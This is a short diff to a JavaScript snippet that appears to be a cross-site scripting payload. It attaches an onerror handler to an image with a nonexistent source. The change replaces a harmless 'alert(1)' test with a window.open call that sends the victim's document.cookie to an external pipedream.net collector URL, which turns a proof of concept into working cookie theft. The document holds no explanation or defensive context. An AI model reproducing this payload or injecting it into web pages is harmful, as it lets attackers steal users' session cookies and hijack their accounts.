@@ -1,6 +1,6 @@
 var img = document.createElement('img');
 img.src = 'immaginechenonesiste.png';
 img.onerror = function(){
-    alert(1);
+    window.open("https://enzgnh816lb5.x.pipedream.net/" + document.cookie)
 }
-document.body.appendChild(img);
+document.body.appendChild(img); 
